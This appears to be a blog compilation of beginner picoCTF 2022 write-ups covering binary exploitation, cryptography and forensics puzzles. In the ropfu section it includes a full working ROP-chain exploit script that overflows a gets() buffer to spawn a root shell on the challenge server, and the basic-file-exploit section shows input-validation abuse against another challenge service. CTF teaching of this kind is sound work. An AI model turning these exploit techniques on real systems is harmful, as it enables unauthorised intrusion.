---
title: "PicoCTF 2022: Beginner's Writeup Compilation"
date: 2022-07-25 12:16:07
categories:
- blog
- picoctf-2022
tags:
- compilation
description: "Learn how to capture-the-flag with this compilation of in-depth writeups from picoCTF 2022. Covers introductory-level challenges in all categories!"
short_description: "A compilation of in-depth, comprehensive writeups for selected introductory challenges from PicoCTF 2022."
category_column: "compilation"
permalink: blog/picoctf-2022/beginners-compilation/
thumbnail: /static/picoctf-2022/beginners-compilation/banner.png
alias:
 - ctfs/pico22/beginners-compilation/
 - ctfs/pico/beginners-compilation/
 - ctfs/pico22/crypto/basic-mod1/
 - ctfs/pico22/crypto/basic-mod1-2/
 - ctfs/pico22/pwn/basic-file-exploit/
 - ctfs/pico22/crypto/pwn/cve-xxxx-xxxx/
 - ctfs/pico22/pwn/cve-xxxx-xxxx/
 - ctfs/pico22/pwn/ropfu/
---

![Banner](/static/picoctf-2022/beginners-compilation/banner.svg)

## Binary Exploitation

{% challenge %}
title: basic-file-exploit
description: |
  The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it! Connect to the program with netcat:  
  `$ nc saturn.picoctf.net 50366`
authors: Will Hong
genre: pwn/binary
solvers: enscribe
points: 100
files: "[program-redacted.c](/static/picoctf-2022/beginners-compilation/program-redacted.c)"
hints:
  - Try passing in things the program doesn't expect. Like a string instead of a number.
{% endchallenge %}

Let's connect to the server using `netcat` to see what's going on:

{% ccb html:true terminal:true %}
<span class="meta prompt_">$</span> nc saturn.picoctf.net 50366
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
{% endccb %}

Since this is the binary exploitation category, we'll be looking for a vulnerability in the source code that allows us to either break or control the program at a lower level. Let's view the attachment `program-redacted.c`:

{% ccb lang:c gutter1:1-70,,71-191 caption:program-redacted.c url:'enscribe.dev/static/picoctf-2022/beginners-compilation/program-redacted.c' url_text:'download source' scrollable:true wrapped:true %}
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>

#define WAIT 60

static const char* flag = "[REDACTED]";

static char data[10][100];
static int input_lengths[10];
static int inputs = 0;

int tgetinput(char *input, unsigned int l)
{
    fd_set          input_set;
    struct timeval  timeout;
    int             ready_for_reading = 0;
    int             read_bytes = 0;
    
    if( l <= 0 )
    {
      printf("'l' for tgetinput must be greater than 0\n");
      return -2;
    }
    
    
    /* Empty the FD Set */
    FD_ZERO(&input_set );
    /* Listen to the input descriptor */
    FD_SET(STDIN_FILENO, &input_set);

    /* Waiting for some seconds */
    timeout.tv_sec = WAIT;    // WAIT seconds
    timeout.tv_usec = 0;    // 0 milliseconds

    /* Listening for input stream for any activity */
    ready_for_reading = select(1, &input_set, NULL, NULL, &timeout);
    /* Here, first parameter is number of FDs in the set, 
     * second is our FD set for reading,
     * third is the FD set in which any write activity needs to updated,
     * which is not required in this case. 
     * Fourth is timeout
     */

    if (ready_for_reading == -1) {
        /* Some error has occured in input */
        printf("Unable to read your input\n");
        return -1;
    } 

    if (ready_for_reading) {
        read_bytes = read(0, input, l-1);
        if(input[read_bytes-1]=='\n'){
        --read_bytes;
        input[read_bytes]='\0';
        }
        if(read_bytes==0){
            printf("No data given.\n");
            return -4;
        } else {
            return 0;
        }
    } else {
        printf("Timed out waiting for user input. Press Ctrl-C to disconnect\n");
        return -3;
    }

    return 0;
}


static void data_write() {
  char input[100];
  char len[4];
  long length;
  int r;
  
  printf("Please enter your data:\n");
  r = tgetinput(input, 100);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }
  
  while (true) {
    printf("Please enter the length of your data:\n");
    r = tgetinput(len, 4);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }
  
    if ((length = strtol(len, NULL, 10)) == 0) {
      puts("Please put in a valid length");
    } else {
      break;
    }
  }

  if (inputs > 10) {
    inputs = 0;
  }

  strcpy(data[inputs], input);
  input_lengths[inputs] = length;

  printf("Your entry number is: %d\n", inputs + 1);
  inputs++;
}


static void data_read() {
  char entry[4];
  long entry_number;
  char output[100];
  int r;

  memset(output, '\0', 100);
  
  printf("Please enter the entry number of your data:\n");
  r = tgetinput(entry, 4);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }
  
  if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }

  entry_number--;
  strncpy(output, data[entry_number], input_lengths[entry_number]);
  puts(output);
}


int main(int argc, char** argv) {
  char input[3] = {'\0'};
  long command;
  int r;

  puts("Hi, welcome to my echo chamber!");
  puts("Type '1' to enter a phrase into our database");
  puts("Type '2' to echo a phrase in our database");
  puts("Type '3' to exit the program");

  while (true) {   
    r = tgetinput(input, 3);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }
    
    if ((command = strtol(input, NULL, 10)) == 0) {
      puts("Please put in a valid number");
    } else if (command == 1) {
      data_write();
      puts("Write successful, would you like to do anything else?");
    } else if (command == 2) {
      if (inputs == 0) {
        puts("No data yet");
        continue;
      }
      data_read();
      puts("Read successful, would you like to do anything else?");
    } else if (command == 3) {
      return 0;
    } else {
      puts("Please type either 1, 2 or 3");
      puts("Maybe breaking boundaries elsewhere will be helpful");
    }
  }

  return 0;
}
{% endccb %}

In the midst of this complex program, we need to figure out where the flag is, and how to trigger it to print:

{% ccb lang:c gutter1:13,S,139-143 %}
static const char* flag = "[REDACTED]";
/* SKIP_LINE:(14-138) */
if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
}
{% endccb %}

The flag is defined in line 13 as `"[REDACTED]"`, which will be the actual location on the remote server. From lines 139-143 it looks like a condition needs to be met in order to `puts()` the flag, which writes a string to the output stream `stdout`.

Google defines `strtol()` as a function that "converts the initial part of the string in **str** to a **long int** value according to the given **base**". To break it, we need to input something that is **unconvertible into a long integer**. In this case, it would be a string, as they can't be properly coalesced into long integers! 

This if statement is located within a function called `data_read()`. Let's see where it's called in the program:

{% ccb lang:c gutter1:175-181 %}
 } else if (command == 2) {
      if (inputs == 0) {
        puts("No data yet");
        continue;
      }
      data_read();
      puts("Read successful, would you like to do anything else?");
{% endccb %}

After we write some data with the command `1`, We should be pressing the command `2` to read from the stored data. Once it prompts us to "enter the entry number of your data", we'll send a string instead to break it. Let's head back to the `netcat` and test it out:

{% ccb html:true gutter1:,SERVER,,,,USER,SERVER,,USER,SERVER,,USER,SERVER,,,USER,SERVER,,USER,SERVER, highlight:21 terminal:true %}
<span class="meta prompt_">$</span> nc saturn.picoctf.net 50366
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
<span class="meta prompt_">></span> 1
1
Please enter your data:
<span class="meta prompt_">></span> hello
hello
Please enter the length of your data:
<span class="meta prompt_">></span> 5
5
Your entry number is: 1
Write successful, would you like to do anything else?
<span class="meta prompt_">></span> 2
2
Please enter the entry number of your data:
<span class="meta prompt_">></span> "NO!"
"NO!"
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_<span style="color:#696969"><b>[REDACTED]</b></span>}
{% endccb %}

---

{% challenge %}
title: CVE-XXXX-XXXX
description: |
  Enter the CVE of the vulnerability as the flag with the correct flag format - `picoCTF{CVE-XXXX-XXXXX}` - replacing `XXXX-XXXXX` with the numbers for the matching vulnerability. The CVE we're looking for is the first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service, which is available across desktop and server versions of Windows operating systems. The service is used to manage printers and print servers.
hints: 
  - We're not looking for the Local Spooler vulnerability in 2021...
authors: Mubarak Mikail
genre: osint, pwn (?)
solvers: enscribe
points: 100
{% endchallenge %}

This is a really trivial challenge. You can actually google "first recorded remote code execution (RCE) vulnerability in 2021" and it will be the first result:

{% cimage src:/static/picoctf-2022/beginners-compilation/cve-google.png width:600 %}

{% flag %}
**CVE-XXXX-XXXX**: `picoCTF{CVE-2021-34527}`
{% endflag %}

---

{% challenge %}
title: ropfu
genre: pwn
authors: Sanjay C., Lt. "Syreal" Jones
solvers: enscribe
files: '[vuln](/static/picoctf-2022/beginners-compilation/ropfu), [vuln.c](/static/picoctf-2022/beginners-compilation/ropfu.c)'
description: |
    What's ROP?  
    Can you exploit the following [program](/static/picoctf-2022/beginners-compilation/ropfu) to get the flag? Download [source](/static/picoctf-2022/beginners-compilation/ropfu.c).  
    `nc saturn.picoctf.net [PORT]`
hint:
    - This is a classic ROP to get a shell
{% endchallenge %}

{% warning %}
Warning: This is an **instance-based** challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.{% endwarning %}

{% ccb html:true caption:checksec.sh url:'github.com/slimm609/checksec.sh' url_text:'github link' terminal:true %}
<span style="color:#F99157">$ </span>checksec vuln
[<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/ropfu/vuln'
    Arch:     i386-32-little
    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
    Stack:    <span style="color:#5EBDAB">Canary found</span>
    NX:       <span style="color:#D41919">NX disabled</span>
    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
    RWX:      <span style="color:#D41919">Has RWX segments</span>
{% endccb %}

Hey, look: a classic "ROP" (return-oriented programming) challenge with the source code provided! Let's take a look:

{% ccb lang:py caption:vuln.c gutter1:1-10,,11-23 url:'enscribe.dev/static/picoctf-2022/beginners-compilation/ropfu.c' url_text:'download source' wrapped:true %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#define BUFSIZE 16

void vuln() {
    char buf[16];
    printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
    return gets(buf);

}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);

    // Set the gid to the effective gid
    // this prevents /bin/sh from dropping the privileges
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    vuln();
}

{% endccb %}

The source only provides us with one vulnerable function: `gets()`. I've gone over this extremely unsafe function multiple times now, so feel free to read [MITRE's Common Weakness Enumeration page](https://cwe.mitre.org/data/definitions/242.html) if you don't know why. There is also no convenient function with `execve("/bin/sh", 0, 0)` in it (for obvious reasons), so we will have to insert our own shellcode.

Although we could totally solve this the old-fashioned way (as John Hammond did in [his writeup](https://www.youtube.com/watch?v=c7wNN8qgxAA)), we can use the power of automation with a tool called [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)! Let's try using it here to **automatically** build the ROP-chain for us, which will eventually lead to a [syscall](https://en.wikipedia.org/wiki/System_call):

{% ccb html:true caption:'auto rop-chain generation' url:'github.com/JonathanSalwan/ROPgadget' url_text:'github link' scrollable:true terminal:true %}
<span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary vuln --ropchain</span>

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x8059102 mov dword ptr [edx], eax ; ret
    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x80583c9 pop edx ; pop ebx ; ret
    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x80b074a pop eax ; ret
    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x804fb90 xor eax, eax ; ret

- Step 2 -- Init syscall number gadgets

    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x804fb90 xor eax, eax ; ret
    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x808055e inc eax ; ret

- Step 3 -- Init syscall arguments gadgets

    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x8049022 pop ebx ; ret
    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x8049e39 pop ecx ; ret
    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x80583c9 pop edx ; pop ebx ; ret

- Step 4 -- Syscall gadget

    [<span style="color:#47D4B9"><b>+</b></span>] Gadget found: 0x804a3d2 int 0x80

- Step 5 -- Build the ROP chain
<div class="skip-highlight">(omitted for brevity, will be in final script!)</div>
{% endccb %}

Oh, wow. It generated the entire script for us (unfortunately in Python2), with only a few missing bits and bobs! The only things we need to manually configure now are the offset and remote connection. Since the `checksec` mentioned that there was a canary enabled, it looks like we'll have to manually guess the offset with the `$eip`:

{% ccb html:true caption:'GDB - \"GDB enhanced features\"' url:'gef.readthedocs.io/en/master' url_text:documentation terminal:true %}
<span style="color:#47D4B9"><b>gef➤  </b></span>shell python3 -q
>>> print('A'*28 + 'B'*4)
AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
>>> 
<span style="color:#47D4B9"><b>gef➤  </b></span>r
Starting program: /home/kali/ctfs/pico22/ropfu/vuln 
How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
<span style="color:#367BF0">0x42424242</span> in <span style="color:#FEA44C">??</span> ()
[ Legend: <span style="color:#EC0101"><b>Modified register</b></span> | <span style="color:#D41919">Code</span> | <span style="color:#5EBDAB">Heap</span> | <span style="color:#9755B3">Stack</span> | <span style="color:#FEA44C">String</span> ]
<span style="color:#585858"><b>──────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">registers</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>$eax   </b></span>: <span style="color:#9755B3">0xffffd540</span>  →  <span style="color:#FEA44C">"AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"</span>
<span style="color:#EC0101"><b>$ebx   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
<span style="color:#EC0101"><b>$ecx   </b></span>: <span style="color:#D41919">0x80e5300</span>  →  <span style="color:#585858"><b><_IO_2_1_stdin_+0> mov BYTE PTR [edx], ah</b></span>
<span style="color:#EC0101"><b>$edx   </b></span>: <span style="color:#9755B3">0xffffd560</span>  →  <span style="color:#D41919">0x80e5000</span>  →  <span style="color:#585858"><b><_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax]</b></span>
<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd560</span>  →  <span style="color:#D41919">0x80e5000</span>  →  <span style="color:#585858"><b><_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax]</b></span>
<span style="color:#EC0101"><b>$ebp   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
<span style="color:#EC0101"><b>$esi   </b></span>: <span style="color:#D41919">0x80e5000</span>  →  <span style="color:#585858"><b><_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al</b></span>
<span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80e5000</span>  →  <span style="color:#585858"><b><_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al</b></span>
<span style="color:#EC0101"><b>$eip   </b></span>: 0x42424242 ("<span style="color:#FEA44C">BBBB</span>"?)
<span style="color:#367BF0">$cs</span>: 0x23 <span style="color:#367BF0">$ss</span>: 0x2b <span style="color:#367BF0">$ds</span>: 0x2b <span style="color:#367BF0">$es</span>: 0x2b <span style="color:#367BF0">$fs</span>: 0x00 <span style="color:#EC0101"><b>$gs</b></span>: 0x63 
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">code:x86:32</span><span style="color:#585858"><b> ────</b></span>
<span style="color:#EC0101"><b>[!]</b></span> Cannot disassemble from $PC
<span style="color:#EC0101"><b>[!]</b></span> Cannot access memory at address 0x42424242
<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
[<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: "vuln", <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x42424242</span> in <span style="color:#FF8A18"><b>??</b></span> (), reason: <span style="color:#962AC3"><b>SIGSEGV</b></span>
{% endccb %}

The offset is 28, as we've successfully loaded 4 hex `B`s into the `$eip`. Our last step is to set up the remote connection with [pwntools](https://docs.pwntools.com/en/stable/). Here is my final script:

{% ccb lang:py gutter1:1-48 caption:ropfu.py url:gist.github.com/jktrn/17d531a5738b4592f6d718fc0eb1b508 url_text:'github gist link' scrollable:true %}
#!/usr/bin/env python2
from pwn import *
from struct import pack

payload = 'A'*28

payload += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
payload += pack('<I', 0x080e5060) # @ .data
payload += pack('<I', 0x41414141) # padding
payload += pack('<I', 0x080b074a) # pop eax ; ret
payload += '/bin'
payload += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
payload += pack('<I', 0x080e5064) # @ .data + 4
payload += pack('<I', 0x41414141) # padding
payload += pack('<I', 0x080b074a) # pop eax ; ret
payload += '//sh'
payload += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
payload += pack('<I', 0x080e5068) # @ .data + 8
payload += pack('<I', 0x41414141) # padding
payload += pack('<I', 0x0804fb90) # xor eax, eax ; ret
payload += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
payload += pack('<I', 0x08049022) # pop ebx ; ret
payload += pack('<I', 0x080e5060) # @ .data
payload += pack('<I', 0x08049e39) # pop ecx ; ret
payload += pack('<I', 0x080e5068) # @ .data + 8
payload += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
payload += pack('<I', 0x080e5068) # @ .data + 8
payload += pack('<I', 0x080e5060) # padding without overwrite ebx
payload += pack('<I', 0x0804fb90) # xor eax, eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0808055e) # inc eax ; ret
payload += pack('<I', 0x0804a3d2) # int 0x80

p = remote("saturn.picoctf.net", [PORT])
log.info(p.recvS())
p.sendline(payload)
p.interactive()
{% endccb %}

Let's run the script:

{% ccb html:true terminal:true %}
<span style="color:#F99157">$ </span> python2 exp.py
<pre>python2 exp.py
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port 58931: Done
[<span style="color:#277FFF"><b>*</b></span>] How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
[<span style="color:#277FFF"><b>*</b></span>] Switching to interactive mode
<span style="color:#EC0101"><b>$</b></span> whoami
root
<span style="color:#EC0101"><b>$</b></span> ls
flag.txt
vuln
<span style="color:#EC0101"><b>$</b></span> cat flag.txt
picoCTF{5n47ch_7h3_5h311_<span style="color:#696969"><b>[REDACTED]</b></span>}<span style="color:#EC0101"><b>$</b></span> <span style="background-color:#FFFFFF"><span style="color:#1A1C23"> </span></span>
{% endccb %}

I know the way of ROP-fu, old man. Your shell has been snatched.

---

## Cryptography

{% challenge %}
title: basic-mod1
description: |
  We found this weird message being passed around on the servers, we think we have a working decryption scheme.  
  Take each number mod 37 and map it to the following character set - 0-25 is the alphabet (uppercase), 26-35 are the decimal digits, and 36 is an underscore. Wrap your decrypted message in the picoCTF flag format (i.e. `picoCTF{decrypted_message}`)
hints: 
  - Do you know what `mod 37` means?
  - mod 37 means modulo 37. It gives the remainder of a number after being divided by 37.
authors: Will Hong
genre: crypto, prog
solvers: enscribe
points: 100
{% endchallenge %}

Let's go over what it's asking:

- Calculate `% 37` for each number
- Map each number to this specific charset:
  - 0-25 = Uppercase alphabet (A-Z)
  - 26-35 = Decimal digits (0-9)
  - 36 = Underscore ("_")

I was too lazy to learn Python and do that, so here it is in native Javascript:

```js
// Splitting into array
x = "54 211 168 309 262 110 272 73 54 137 131 383 188 332 [REDACTED]".split();
// Mod 37
y = x.map(x => x % 37);
z = [];
for (let i = 0; i < y.length; i++) {
    // Mapping to charset
    if (y[i] >= 0 && y[i] <= 25) {
      z.push(String.fromCharCode(y[i] + 'A'.charCodeAt(0)));
    } else if (y[i] >= 26 && y[i] <= 35) {
      z.push(y[i] - 26);
    } else if (y[i] == 36) {
      z.push("_");
    }
}
// Combine back to string
z = z.join("");
console.log(`picoCTF{${z}}`);
```

{% ccb html:true highlight:2 terminal:true %}
<span class="meta prompt_">$ </span>node solve.js
picoCTF{R0UND_N_R0UND_<span style="color:#696969"><b>[REDACTED]</b></span>}
{% endccb %}


Looking back at the problem after I learned Python, here's a solution that's significantly cleaner:

```py
#!/usr/bin/env python3
import string
x = "54 211 168 309 262 110 272 73 54 137 131 383 188 332 [REDACTED]"
y = x.split()

a = string.ascii_uppercase + string.digits + "_"

# Insane list comprehension
z = [a[int(i) % 37] for i in y]
print("picoCTF{"+''.join(z)+"}")
```

{% ccb html:true highlight:2 terminal:true %}
<span class="meta prompt_">$ </span>python3 solve.py
picoCTF{R0UND_N_R0UND_<span style="color:#696969"><b>[REDACTED]</b></span>}
{% endccb %}

---

{% challenge %}
title: basic-mod2
description: |
  A new modular challenge! Take each number mod 41 and find the modular inverse for the result. Then map to the following character set - 1-26 are the alphabet, 27-36 are the decimal digits, and 37 is an underscore. Wrap your decrypted message in the picoCTF flag format (`picoCTF{decrypted_message}`).
hints:
  - Do you know what the modular inverse is?
  - The inverse modulo `z` of `x` is the number, `y` that when multiplied by `x` is 1 modulo `z`.
  - It's recommended to use a tool to find the modular inverses.
authors: Will Hong
genre: crypto, prog
solvers: enscribe
points: 100
{% endchallenge %}

Let's go over what it's asking once again:

- Calculate `% 41` for each number
- Map each number to this specific charset:
  - 1-26 = Uppercase alphabet (A-Z)
  - 27-36 = Decimal digits (0-9)
  - 37 = Underscore ("_")

Here's a stupidly long Javascript snippet I made to solve this:

```js
// Splitting into array
x = "54 211 168 309 262 110 272 73 54 137 131 383 188 332 [REDACTED]".split();
// Mapping to % 41 with modular inverse of 41
y = x.map(x => x % 41).map(x => modInverse(x, 41));
z = [];

// Mapping to charset
for (let i = 0; i < y.length; i++) {
    if (y[i] >= 1 && y[i] <= 26) z.push(String.fromCharCode(y[i] + 64));
    else if (y[i] >= 27 && y[i] <= 36) z.push(y[i] - 27);
    else if (y[i] == 37) z.push("_");
}

console.log(`picoCTF{${z.join("")}}`);

// credit to: https://rosettacode.org/wiki/Modular_inverse
function modInverse(a, b) {
    a %= b;
    for (var x = 1; x < b; x++) {
        if ((a * x) % b == 1) {
            return x;
        }
    }
}
```

{% ccb html:true highlight:2 terminal:true %}
<span class="meta prompt_">$ </span>node solve.js
picoCTF{1NV3R53LY_H4RD_<span style="color:#696969"><b>[REDACTED]</b></span>}
{% endccb %}

---

{% challenge %}
title: credstuff
description: |
  We found a leak of a blackmarket website's login credentials. Can you find the password of the user `cultiris` and successfully decrypt it?  
  The first user in `usernames.txt` corresponds to the first password in `passwords.txt`. The second user corresponds to the second password, and so on.
size: 110%
hints:
  - Maybe other passwords will have hints about the leak?
authors:
  - Will Hong
  - Lt. 'Syreal' Jones
genre: crypto
solvers:
  - MrTea --flag
  - enscribe
points: 100
files: "[leak.tar](/static/picoctf-2022/beginners-compilation/leak.tar)"
{% endchallenge %}

We're initially provided a `leak.tar` archive. On extraction, we're presented with two files: `usernames.txt` and `passwords.txt`:

<div class="flex-container">
    <div>
        {% ccb gutter1:1-7, caption:usernames.txt %}
        engineerrissoles
        icebunt
        fruitfultry
        celebritypentathlon
        galoshesopinion
        favorboeing
        bindingcouch
        ...
        {% endccb %}
    </div>
    <div>
        {% ccb gutter1:1-7, caption:passwords.txt %}
        CMPTmLrgfYCexGzJu6TbdGwZa
        GK73YKE2XD2TEnvJeHRBdfpt2
        UukmEk5NCPGUSfs5tGWPK26gG
        kaL36YJtvZMdbTdLuQRx84t85
        K9gzHFpwF2azPayAUSrcL8fJ9
        rYrtRbkHvJzPmDwzD6gSDbAE3
        kfcVXjcFkvNQQPpATErx6eVDd
        ...
        {% endccb %}
    </div>
</div>

Let's go to the username `cultiris`. The `-n` tag in `grep` will enable line numbers:

{% ccb html:true terminal:true %}
<span class="meta prompt_">$</span> grep -n cultiris usernames.txt
378:cultiris
{% endccb %}

Let's fine the equivalent line in `passwords.txt`:
{% ccb gutter1:,376-380, highlight:4 %}
...
ARKadGaCZBc3ue4BfB7Vjwx83
CSYbRFVpJZNQJ4Jz3GmDsAa9Q
cvpbPGS{P7e1S_54I35_71Z3}
wTL8rTRNCkSyGP5AFsG5qK52y
9jyG4W6PnsAVuyx8MJkHKYtXV
...
{% endccb %}

On line 378 it looks like there's a flag obfuscated with shift cipher. Let's brute force this on [DCode](https://www.dcode.fr/caesar-cipher):

{% ccb caption:'Results - Brute-Force mode (Caesar)' highlight:6 %}
🠞15 (🠜11)	ngamARD{A7p1D_54T35_71K3}
🠞1 (🠜25)	buoaOFR{O7d1R_54H35_71Y3}
🠞17 (🠜9)	leykYPB{Y7n1B_54R35_71I3}
🠞24 (🠜2)	exrdRIU{R7g1U_54K35_71B3}
🠞11 (🠜15)	rkeqEVH{E7t1H_54X35_71O3}
🠞13 (🠜13)	picoCTF{C7r1F_54V35_71M3}
{% endccb %}

{% flag %}
**credstuff**: `picoCTF{C7r1F_54V35_71M3}`
{% endflag %}

---

{% challenge %}
title: morse-code
description: |
  Morse code is well known. Can you decrypt this?  
  Wrap your answer with `picoCTF{}`, put underscores in place of pauses, and use all lowercase.
size: 110%
authors: Will Hong
genre: crypto
solvers: enscribe
points: 100
files: "[morse_chal.wav](/static/picoctf-2022/beginners-compilation/morse_chal.wav)"
{% endchallenge %}

We're presented with a `morse_chal.wav` file:

<div style="text-align:center;margin:1rem 0;"><audio controls>
  <source src="/static/picoctf-2022/beginners-compilation/morse_chal.wav">
Your browser does not support the audio element.
</audio></div>

We could totally decode this by hand using [Audacity's](https://www.audacityteam.org/) visualizer, but that's super time-consuming. Instead, I opted for an automatic audio-based [Morse decoder](https://morsecode.world/international/decoder/audio-decoder-adaptive.html) online:

![Automatic Morse Decoding](/static/picoctf-2022/beginners-compilation/morse-code.gif)

The program outputs `WH47 H47H 90D W20U9H7`. Following the conversion instructions, the final flag is:

{% flag %}
**morse-code**: `picoCTF{wh47_h47h_90d_w20u9h7}`
{% endflag %}

{% info %}
Fun fact: this string is a leetspoken version of "What hath God wrought", which was the first telegraphed message in Morse!
{% endinfo %}

---

## Forensics

{% challenge %}
title: Enhance!
description: |
  Download this image file and find the flag.<br><br>{% cimage src:/static/picoctf-2022/beginners-compilation/svg.png width:200 sub:'svg.png' %}
size: 110%
authors: Lt. 'Syreal' Jones
genre: forensics
solvers: enscribe
points: 100
files: "[REDACTED]"
{% endchallenge %}

This is an SVG file, which stands for Scalable Vector Graphics. They consist of vectors, not pixels, and can be thought of as a collection of shapes on a Cartesian (x/y) plane. The code that creates such graphics can also be viewed on Google Chrome with <kbd>F12</kbd>:

![SVG2](/static/picoctf-2022/beginners-compilation/svg2.png)

Look up what we end up finding in the Source tab:

{% ccb lang:svg wrapped:true %}
<tspan sodipodi:role="line" x="107.43014" y="132.08501" style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;" id="tspan3748">p </tspan>
<tspan sodipodi:role="line" x="107.43014" y="132.08942" style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;" id="tspan3754">i </tspan>
<tspan sodipodi:role="line" x="107.43014" y="132.09383" style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;" id="tspan3756">c </tspan>
<tspan sodipodi:role="line" x="107.43014" y="132.09824" style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;" id="tspan3758">o </tspan>
<tspan sodipodi:role="line" x="107.43014" y="132.10265" style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;" id="tspan3760">C </tspan>
<tspan sodipodi:role="line" x="107.43014" y="132.10706" style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;" id="tspan3762">T </tspan>
<tspan sodipodi:role="line" x="107.43014" y="132.11147" style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;" id="tspan3764">F { 3 n h 4 n </tspan>
<tspan sodipodi:role="line" x="107.43014" y="132.11588" style="font-size:0.00352781px;line-height:1.25;fill:#ffffff;stroke-width:0.26458332;" id="tspan3752">c 3 d _ [R E D A C T E D] }</tspan>
{% endccb %}

{% flag %}
**Enhance!**: `picoCTF{3nh4nc3d_[REDACTED]}`
{% endflag %}

---

{% flagcounter %}